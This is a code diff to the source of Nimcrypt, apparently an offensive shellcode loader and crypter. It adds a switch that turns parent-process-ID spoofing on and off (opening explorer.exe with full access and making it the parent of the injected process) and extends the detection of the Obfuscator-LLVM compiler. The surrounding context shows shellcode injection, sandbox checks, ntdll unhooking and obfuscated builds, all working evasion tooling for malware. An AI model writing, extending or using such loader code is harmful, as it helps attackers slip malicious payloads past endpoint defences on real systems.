@@ -52,7 +52,7 @@ let doc = """
 Nimcrypt v 2.0
 
 Usage:
-  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v]
+  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v] [--no-ppid-spoof]
   nimcrypt (-h | --help)
 
 Options:
@@ -69,6 +69,7 @@ Options:
   -l --llvm-obfuscator   Use Obfuscator-LLVM to compile binary
   -n --no-randomization  Disable syscall name randomization
   -s --no-sandbox        Disable sandbox checks
+  --no-ppid-spoof        Disable PPID Spoofing
 """
 
 
@@ -90,6 +91,7 @@ var llvm_obfuscator: bool = false
 var get_syscallstub: bool = false
 var no_sandbox: bool = false
 var no_randomization: bool = false
+var no_ppid_spoof: bool = false
 
 if args["--file"]:
   filename = $args["--file"]
@@ -122,6 +124,9 @@ if args["--get-syscallstub"]:
 
 if args["--no-randomization"]:
   no_randomization = args["--no-randomization"]
+
+if args["--no-ppid-spoof"]:
+  no_ppid_spoof = args["--no-ppid-spoof"]
 
 if args["--output"]:
   outfile = $args["--output"]
@@ -544,6 +549,8 @@ proc inject(shellcode: ptr, sc_len: int): void =
 
     DeleteProcThreadAttributeList(si.lpAttributeList)
 
+    var status = 0
+    PPID_SPOOF_START
     var processId = GetProcessByName("explorer.exe")
     echo fmt"[*] Found PPID: {processId}"
 
@@ -553,13 +560,14 @@ proc inject(shellcode: ptr, sc_len: int): void =
 
     cid.UniqueProcess = processID
 
-    var status = NtOpenProcess(&parentHandle, PROCESS_ALL_ACCESS, &oa, &cid)
+    status = NtOpenProcess(&parentHandle, PROCESS_ALL_ACCESS, &oa, &cid)
     if status == 0:
         echo "[*] NtOpenProcess opened parent process successfully."
     else:
         echo fmt"[!] NtOpenProcess failed to open parent process: {status}"
 
     res = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, addr parentHandle, sizeof(parentHandle), NULL, NULL)
+    PPID_SPOOF_END
 
     res = CreateProcess(
         NULL,
@@ -682,6 +690,14 @@ when defined(windows):
     else:
         echo "[+] Unhooking ntdll.dll disabled"
         stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", "")
+    if no_ppid_spoof == true:
+        echo "[+] PPID spoofing disabled"
+        stubFinal = stubFinal.replace("PPID_SPOOF_START", "#[")
+        stubFinal = stubFinal.replace("PPID_SPOOF_END", "]#")
+    else:
+        echo "[+] PPID spoofing enabled"
+        stubFinal = stubFinal.replace("PPID_SPOOF_START", "")
+        stubFinal = stubFinal.replace("PPID_SPOOF_END", "")
     if verbose == true:
         echo "[+] Verbose messages enabled"
         stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "true")
@@ -712,7 +728,7 @@ when defined(windows):
         else:
             echo "[+] Using LLVM-Obfuscator to compile"
             var result = execCmdEx("x86_64-w64-mingw32-clang -v")
-            if "Obfuscator-LLVM" in result.output:
+            if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
                 let ochars = {'A'..'Z','0'..'9'}
                 var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
                 #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
@@ -725,7 +741,7 @@ when defined(windows):
         else:
             echo "[+] Using Obfuscator-LLVM to compile"
             var result = execCmdEx("x86_64-w64-mingw32-clang -v")
-            if "Obfuscator-LLVM" in result.output:
+            if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
                 let ochars = {'A'..'Z','0'..'9'}
                 var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
                 #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
@@ -864,7 +880,7 @@ assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
     else:
         echo "[+] Using Obfuscator-LLVM to compile"
         var result = execCmdEx("x86_64-w64-mingw32-clang -v")
-        if "Obfuscator-LLVM" in result.output:
+        if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
             let ochars = {'A'..'Z','0'..'9'}
             var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
             #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
@@ -1214,7 +1230,7 @@ status = NtWaitForSingleObject(hThread, TRUE, NULL)
     else:
         echo "[+] Using Obfuscator-LLVM to compile"
         var result = execCmdEx("x86_64-w64-mingw32-clang -v")
-        if "Obfuscator-LLVM" in result.output:
+        if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
             let ochars = {'A'..'Z','0'..'9'}
             var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
             #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
